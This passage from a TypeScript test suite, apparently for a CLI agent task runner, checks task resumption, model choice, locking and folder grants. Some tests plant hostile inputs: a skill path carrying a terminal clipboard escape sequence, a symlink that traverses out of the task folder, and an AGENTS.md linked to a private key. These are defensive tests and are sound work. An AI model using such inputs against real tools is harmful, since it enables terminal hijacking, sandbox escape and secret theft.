        .filter(([level]) => level === "WARNING")
        .map(([, text]) => text);
      expect(warnings).toContain("skills.json isn't JSON, so no skill is switched off");
      expect(mind.requests[0]?.system).toContain('<skill name="ship" from="owner">');
    } finally {
      rmSync(sharedSkillsDir(), { recursive: true, force: true });
      rmSync(skillSwitchesPath(dataHome()), { force: true });
    }
  });

  test("a skill's warning spells out the control characters in its path, which could drive the terminal", async () => {
    const bad = join(folder, ".agents", "skills", "evil\u001b]52;c;eA==\u0007");
    mkdirSync(bad, { recursive: true });
    writeFileSync(join(bad, "SKILL.md"), "No frontmatter.\n");
    const mind = scripted([says("Done.")]);
    const io = { ...captureIo().io, createMind: mind.createMind, confirm: null };
    expect(await taskMain(["--folder", folder, "Make a page"], io)).toBe(0);
    const warnings = logs.records.filter(([level]) => level === "WARNING").map(([, text]) => text);
    expect(warnings.some((text) => text.includes("evil\\u001b]52;c;eA==\\u0007"))).toBe(true);
    expect(warnings.some((text) => text.includes("\u001b"))).toBe(false);
  });

  test("a task of the local app's, one with a chat, isn't resumed: its card there goes on with it", async () => {
    const first = scripted([
      // biome-ignore lint/correctness/useYield: it fails before its first chunk.
      async function* () {
        throw new ProviderHttpError("OpenRouter", 400, "No such model");
      },
    ]);
    expect(
      await taskMain(["--folder", folder, "Look it up"], {
        ...captureIo().io,
        createMind: first.createMind,
        confirm: null,
      }),
    ).toBe(1);
    const { id, dir } = onlyTask();
    // As the app's manager leaves one: paused on a site it asks the owner about.
    const app: TaskSnapshot = {
      ...((await readSnapshot(dir)) as TaskSnapshot),
      status: "paused",
      chat: { id: "chat-1", persona: "milky-green", call: "call-1" },
      web: { mode: "ask", hosts: [], denied: [] },
      pending: { kind: "fetch", host: "example.com" },
    };
    await writeSnapshot(dir, app);
    const before = readFileSync(join(dir, "transcript.jsonl"), "utf8");

    const resumed = scripted([says("Done.")]);
    const io = captureIo();
    expect(
      await taskMain(["--resume", id], { ...io.io, createMind: resumed.createMind, confirm: null }),
    ).toBe(2);
    expect(io.stderr()).toEndWith(
      `laplace-task: error: argument --resume: task ${id} belongs to a chat in the local app, ` +
        "and goes on from its card there\n",
    );
    expect(resumed.made).toEqual([]);
    expect(await readSnapshot(dir)).toEqual(app);
    expect(readFileSync(join(dir, "transcript.jsonl"), "utf8")).toBe(before);
    // Nor is its lock taken.
    acquireLock(`task:${id}`, "probe")();
  });

  test("with no assistant model and no --model, it exits 2 saying how to choose one", async () => {
    const mind = scripted([says("Done.")]);
    for (const env of [
      { ASSISTANT_PROVIDER: undefined, ASSISTANT_MODEL: undefined },
      { ASSISTANT_PROVIDER: "openrouter", ASSISTANT_MODEL: " " },
      { ASSISTANT_PROVIDER: undefined, ASSISTANT_MODEL: "test/model" },
    ]) {
      const restore = setEnv(env);
      try {
        const io = captureIo();
        const code = await taskMain(["--folder", folder, "Write hello.txt"], {
          ...io.io,
          createMind: mind.createMind,
          confirm: null,
        });
        expect([env, code]).toEqual([env, 2]);
        expect(io.stderr()).toStartWith("usage: laplace-task ");
        expect(io.stderr()).toContain(
          "laplace-task: error: no model to run the task on: pass --model ACCOUNT/MODEL, or " +
            "choose the assistant's account and model under Assistant Mode in the app's Settings",
        );
      } finally {
        restore();
      }
    }
    expect(mind.made).toEqual([]);
    expect(existsSync(folder)).toBe(false);
    expect(existsSync(tasksDir())).toBe(false);

    // --model chooses for itself, split at its first slash.
    const restore = setEnv({ ASSISTANT_PROVIDER: undefined, ASSISTANT_MODEL: undefined });
    try {
      expect(
        await taskMain(
          ["--model", "OpenRouter/anthropic/claude-sonnet-5.5", "--folder", folder, "Write it"],
          { ...captureIo().io, createMind: mind.createMind, confirm: null },
        ),
      ).toBe(0);
    } finally {
      restore();
    }
    expect(mind.made[0]?.options).toMatchObject({
      account: "openrouter",
      model: "anthropic/claude-sonnet-5.5",
    });
    expect((await readSnapshot(onlyTask().dir))?.model).toEqual({
      account: "openrouter",
      model: "anthropic/claude-sonnet-5.5",
    });
  });

  test("a model it can't have, its key missing, exits 1 before anything is made", async () => {
    const missing = "OpenRouter needs an API key: set OPENROUTER_API_KEY";
    const io = captureIo();
    const code = await taskMain(["--folder", folder, "Write hello.txt"], {
      ...io.io,
      createMind: () => {
        throw new ProviderConfigError(missing);
      },
      confirm: null,
    });
    expect(code).toBe(1);
    expect(logs.records).toContainEqual(["ERROR", missing]);
    expect(existsSync(folder)).toBe(false);
    expect(existsSync(tasksDir())).toBe(false);
  });

  test("a folder no task may write, or a grant holding home, is refused before anything is made", async () => {
    const mind = scripted([says("Done.")]);
    const inData = join(dataHome(), "work");
    for (const [argv, message] of [
      [["--folder", inData, "x"], `No task may write ${realpathSync(dataHome())}/work`],
      [
        ["--folder", homedir(), "x"],
        `No task may be granted ${homedir()}: it is or holds the home`,
      ],
      [
        ["--folder", folder, "--allow", homedir(), "x"],
        `No task may be granted ${homedir()}: it is or holds the home`,
      ],
    ] as const) {
      const io = captureIo();
      const code = await taskMain(argv, { ...io.io, createMind: mind.createMind, confirm: null });
      expect([argv, code]).toEqual([argv, 2]);
      expect(io.stderr()).toContain(`laplace-task: error: ${message}`);
    }
    expect(mind.made).toEqual([]);
    expect(existsSync(inData)).toBe(false);
    expect(existsSync(folder)).toBe(false);
    expect(existsSync(tasksDir())).toBe(false);
  });

  test("a folder that is a link leading nowhere is refused, not taken for the folder its text names", async () => {
    // As text, docs is the temp folder above `work`; the kernel stops at the missing `nope`.
    const repo = join(work, "evil");
    mkdirSync(repo);
    symlinkSync("nope/../../..", join(repo, "docs"));
    const mind = scripted([calls([call("c1", "write", { path: "planted.txt", content: "x" })])]);
    const io = captureIo();
    const code = await taskMain(["--folder", join(repo, "docs"), "Write the docs"], {
      ...io.io,
      createMind: mind.createMind,
      confirm: null,
    });
    expect(code).toBe(2);
    expect(io.stderr()).toContain(
      `laplace-task: error: ${join(repo, "docs")} can't be the task's folder: ENOENT`,
    );
    expect(mind.made).toEqual([]);
    expect(existsSync(join(tmpdir(), "planted.txt"))).toBe(false);
    expect(existsSync(tasksDir())).toBe(false);
  });

  test("an AGENTS.md linked out of the task's folders stays out of the worker's prompt", async () => {
    mkdirSync(folder);
    writeFileSync(join(work, "id_rsa"), "PRIVATE-KEY-SECRET");
    symlinkSync("../id_rsa", join(folder, "AGENTS.md"));
    writeFileSync(join(folder, "CLAUDE.md"), "Use two spaces.");
    const mind = scripted([says("Done.")]);
    expect(
      await taskMain(["--folder", folder, "Write it"], {
        ...captureIo().io,
        createMind: mind.createMind,
        confirm: null,
      }),
    ).toBe(0);
    const system = mind.requests[0]?.system ?? "";
    expect(system).toContain("Use two spaces.");
    expect(system).not.toContain("PRIVATE-KEY-SECRET");
  });

  test("a path outside the task's folders is an error result it goes on from; --allow and assistant.folders grant one", async () => {
    const outside = join(work, "outside");
    mkdirSync(outside);
    const write = calls([call("c1", "write", { path: "../outside/note.txt", content: "x" })]);
    const refused = scripted([write, says("I can't write there.")]);
    expect(
      await taskMain(["--folder", folder, "Write the note"], {
        ...captureIo().io,
        createMind: refused.createMind,
        confirm: null,
      }),
    ).toBe(0);
    expect(existsSync(join(outside, "note.txt"))).toBe(false);
    const result = transcript(onlyTask().dir).find((entry) => entry.type === "tool-result");
    expect(result).toMatchObject({
      isError: true,
      refused: { path: join(realpathSync(outside), "note.txt"), access: "write" },
    });
    rmSync(tasksDir(), { recursive: true, force: true });

    const allowed = scripted([write, says("Written.")]);
    expect(
      await taskMain(["--folder", folder, "--allow", outside, "Write the note"], {
        ...captureIo().io,
        createMind: allowed.createMind,
        confirm: null,
      }),
    ).toBe(0);
    expect(readFileSync(join(outside, "note.txt"), "utf8")).toBe("x");
    expect((await readSnapshot(onlyTask().dir))?.grants).toEqual([
      { path: outside, access: "read-write" },
    ]);
    rmSync(tasksDir(), { recursive: true, force: true });
    rmSync(join(outside, "note.txt"));

    const restore = setEnv({ ASSISTANT_FOLDERS: outside });
    try {
      const configured = scripted([write, says("Written.")]);
      expect(
        await taskMain(["--folder", folder, "Write the note"], {
          ...captureIo().io,
          createMind: configured.createMind,
          confirm: null,
        }),
      ).toBe(0);
    } finally {
      restore();
    }
    expect(readFileSync(join(outside, "note.txt"), "utf8")).toBe("x");
    expect((await readSnapshot(onlyTask().dir))?.grants).toEqual([
      { path: outside, access: "read-write" },
    ]);
  });

  test("Ctrl-C cancels the task, which exits 130 and resumes later, on another model if asked", async () => {
    const controller = new AbortController();
    const mind = scripted([
      async function* () {
        controller.abort(new DOMException("Interrupted by SIGINT", "AbortError"));
        yield* says("Never seen.");
      },
    ]);
    const io = captureIo();
    expect(
      await taskMain(["--folder", folder, "Write hello.txt"], {
        ...io.io,
        createMind: mind.createMind,
        confirm: null,
        signal: controller.signal,
      }),
    ).toBe(130);
    const { id, dir } = onlyTask();
    expect(transcript(dir).at(-1)).toMatchObject({
      type: "end",
      outcome: { status: "cancelled" },
    });
    expect(await readSnapshot(dir)).toMatchObject({
      status: "cancelled",
      outcome: { status: "cancelled" },
      endedAt: expect.any(Number),
    });
    expect(io.stdout()).toBe(
      `\nTask ${id} was cancelled.\nResume it with: bun run laplace-task --resume ${id}\n`,
    );

    const again = scripted([says("Done.")]);
    expect(
      await taskMain(["--resume", id, "--model", "anthropic/claude-sonnet-5-5"], {
        ...captureIo().io,
        createMind: again.createMind,
        confirm: null,
      }),
    ).toBe(0);
    expect(again.made[0]?.options).toMatchObject({
      account: "anthropic",
      model: "claude-sonnet-5-5",
    });
    const snapshot = await readSnapshot(dir);
    expect(snapshot).toMatchObject({
      status: "succeeded",
      model: { account: "anthropic", model: "claude-sonnet-5-5" },
    });
  });

  test("a task whose transcript is gone or damaged isn't resumed, and keeps its status", async () => {
    const restore = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0.5" });
    try {
      const first = scripted([calls([call("c1", "write", { path: "a.txt", content: "a" })])], 0.6);
      expect(
        await taskMain(["--folder", folder, "Write a.txt"], {
          ...captureIo().io,
          createMind: first.createMind,
          confirm: null,
        }),
      ).toBe(3);
    } finally {
      restore();
    }
    const { id, dir } = onlyTask();
    const path = join(dir, "transcript.jsonl");
    const lines = readFileSync(path, "utf8").split("\n");
    for (const [damage, why] of [
      [() => writeFileSync(path, [lines[0], "{not json", ...lines.slice(2)].join("\n")), "line 2"],
      [() => rmSync(path), "has no brief"],
    ] as const) {
      damage();
      const mind = scripted([says("Done.")]);
      const io = captureIo();
      expect(
        await taskMain(["--resume", id], { ...io.io, createMind: mind.createMind, confirm: null }),
      ).toBe(2);
      expect(io.stderr()).toContain(`laplace-task: error: argument --resume: task ${id} `);
      expect(io.stderr()).toContain(why);
      expect(mind.requests).toEqual([]);
      expect((await readSnapshot(dir))?.status).toBe("paused");
    }
  });

  test("a task another process runs, or one that doesn't exist, isn't resumed", async () => {
    // A task holds its lock while it runs, from its first request.
    let held: unknown;
    const mind = scripted([
      async function* () {
        const [running] = readdirSync(tasksDir());
        try {
          acquireLock(`task:${running}`, "probe")();
        } catch (error) {
          held = error;
        }
        yield* says("Done.");
      },
    ]);
    expect(
      await taskMain(["--folder", folder, "Write it"], {
        ...captureIo().io,
        createMind: mind.createMind,
        confirm: null,
      }),
    ).toBe(0);
    const { id, dir } = onlyTask();
    expect(held).toBeInstanceOf(LockedError);
    const before = readFileSync(join(dir, "transcript.jsonl"), "utf8");
    const release = acquireLock(`task:${id}`, "laplace-task");
    try {
      expect(
        await taskMain(["--resume", id], {
          ...captureIo().io,
          createMind: mind.createMind,
          confirm: null,
        }),
      ).toBe(1);
    } finally {
      release();
    }
    expect(logs.records).toContainEqual([
      "ERROR",
      `Another laplace-task is running for ${id} (pid ${process.pid}).`,
    ]);
    expect(readFileSync(join(dir, "transcript.jsonl"), "utf8")).toBe(before);

    // Free again, the finished task resumes to the report it already gave, asking nothing.
    const again = captureIo();
    const unasked = scripted([]);
    expect(
      await taskMain(["--resume", id], {
        ...again.io,
        createMind: unasked.createMind,
        confirm: null,
      }),
    ).toBe(0);
    expect(unasked.requests).toEqual([]);
    expect(again.stdout()).toBe(`Done.\n\nTask ${id} succeeded.\n`);
    expect(transcript(dir).map((entry) => entry.type)).toEqual([
      "brief",
      "assistant",
      "end",
      "resume",
      "end",
    ]);

    const missing = "0199e0a4-7c5e-7000-8000-000000000000";
    const io = captureIo();
    expect(await taskMain(["--resume", missing], { ...io.io, confirm: null })).toBe(2);
    expect(io.stderr()).toEndWith(`laplace-task: error: argument --resume: no task '${missing}'\n`);
  });
});

describe("parseTaskArgs", () => {
  function usageError(argv: readonly string[]): string {
    try {
      parseTaskArgs(argv);
    } catch (error) {
      if (error instanceof ArgparseExit && error.code === 2) {
        return error.stderr.split("laplace-task: error: ")[1]?.trimEnd() ?? "";
      }
      throw error;
    }
    throw new Error(`${argv.join(" ")} parsed`);
  }

  test("a new task needs a folder and a goal; the brief's other fields have defaults", () => {
    expect(usageError(["x"])).toBe("the following arguments are required: --folder");
    expect(usageError(["--folder", "/tmp/x"])).toBe("the following arguments are required: goal");
    expect(usageError(["--folder", "/tmp/x", " "])).toBe("argument goal: must not be empty");
    expect(
      parseTaskArgs([
        "--folder",
        "~/work",
        "--allow",
        "notes",
        "--deliverable",
        "index.html",
        "--json",
        " Write it ",
      ]),
    ).toEqual({
      kind: "new",
      goal: "Write it",
      folder: join(homedir(), "work"),
      allow: [join(process.cwd(), "notes")],
      deliverable: "index.html",
      check: "The result does what the goal asks",
      model: null,
      web: "off",
      skills: [],
      json: true,
    });
    const named = parseTaskArgs([
      "--folder",
      "/tmp/x",
      "--skill",
      " ship ",
      "--skill",
      "house-style",
      "--skill",
      "ship",
      "x",
    ]);
    expect(named.kind === "new" && named.skills).toEqual(["ship", "house-style"]);
  });

  test("--model names an account, then a model; --resume takes a task's id and no brief", () => {
    for (const model of ["openrouter", "openrouter/", "/gpt-5"]) {
      expect(usageError(["--model", model, "--folder", "/tmp/x", "x"])).toStartWith(
        "argument --model: expected ACCOUNT/MODEL, as in openrouter/anthropic/claude-sonnet-5.5",
      );
    }
    const id = "0199E0A4-7C5E-7000-8000-000000000000";
    expect(parseTaskArgs(["--resume", id, "--model", "openai/gpt-5"])).toEqual({
      kind: "resume",
      id: id.toLowerCase(),
      model: { account: "openai", model: "gpt-5" },
      web: null,
      json: false,
    });
    expect(usageError(["--resume", "../x"])).toBe("argument --resume: no task '../x'");
    expect(usageError(["--resume", id, "--folder", "/tmp/x"])).toBe(
      "argument --resume: not allowed with argument --folder",
    );
    expect(usageError(["--resume", id, "goal"])).toBe(
      "argument --resume: not allowed with argument goal",
    );
  });

  test("--web is any or off: off for a new task unless given, a resumed task's own unless given", () => {
    const id = "0199e0a4-7c5e-7000-8000-000000000000";
    expect(parseTaskArgs(["--web", "any", "--folder", "/tmp/x", "x"])).toMatchObject({
      kind: "new",
      web: "any",
    });
    expect(parseTaskArgs(["--folder", "/tmp/x", "x"])).toMatchObject({ kind: "new", web: "off" });
    expect(parseTaskArgs(["--resume", id, "--web", "off"])).toMatchObject({
      kind: "resume",
      web: "off",
    });
    expect(parseTaskArgs(["--resume", id])).toMatchObject({ kind: "resume", web: null });
    expect(usageError(["--web", "ask", "--folder", "/tmp/x", "x"])).toBe(
      "argument --web: invalid choice: 'ask' (choose from any, off)",
    );
  });

  test("-h says it ignores Assistant Mode, and how it exits", () => {
    let help = "";
    try {
      parseTaskArgs(["-h"]);
    } catch (error) {
      if (!(error instanceof ArgparseExit)) throw error;
      expect(error.code).toBe(0);
      help = error.stdout;
    }
    expect(help).toStartWith(
      "usage: laplace-task [-h] [--folder FOLDER] [--allow PATH] [--web {any,off}]\n",
    );
    expect(help).toContain(
      "  --web {any,off}       Whether the task may fetch web pages, from any site,\n" +
        "                        and search the web once assistant.search.provider\n" +
        "                        is set (default: off; with --resume, the task's own)\n",
    );
    expect(help).toContain("Assistant Mode (assistant.enabled) governs the local app");
    expect(help).toContain("It exits 0 when the task succeeded, 1 when it failed, 3 when it");
  });
});
